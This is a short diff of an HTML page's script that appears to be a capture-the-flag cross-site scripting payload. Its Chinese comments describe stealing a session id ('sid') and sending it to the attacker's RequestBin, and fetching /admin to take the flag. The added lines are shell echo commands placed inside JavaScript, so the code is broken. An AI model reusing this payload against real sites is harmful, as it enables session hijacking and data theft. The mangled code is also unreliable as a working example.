@@ -27,7 +27,7 @@
         mode: 'no-cors', // 关键：避免Puppeteer报跨域错误
         cache: 'no-cache'
     });
-
+    echo "获取sid并发送到攻击者的RequestBin";
     // 额外：同时尝试直接访问/admin拿FLAG，一步到位（可选，不影响sid窃取）
     fetch('/admin', {mode: 'no-cors'})
         .then(res => res.text().catch(() => 'no_flag'))
@@ -39,6 +39,7 @@
                 });
             }
         });
+    echo "尝试直接访问/admin拿FLAG，一步到位";
 </script>
 </body>
 </html>
